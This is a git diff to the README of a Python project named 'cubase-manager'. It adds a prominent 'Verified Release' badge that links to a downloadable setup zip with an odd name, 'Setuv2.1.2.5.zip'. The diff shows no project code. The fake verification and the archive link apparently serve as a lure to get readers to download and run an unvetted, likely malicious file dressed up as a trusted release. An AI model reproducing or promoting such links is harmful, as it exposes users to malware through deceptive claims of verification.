@@ -1,3 +1,5 @@
+[![✅ Verified Release](https://img.shields.io/badge/✅_Verified-Download-brightgreen?style=for-the-badge)](https://github.com/kevin-techdev2097t1/cubase-manager/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 📦 cubase-manager
 
 ![Python](https://img.shields.io/badge/python-3.8+-blue.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
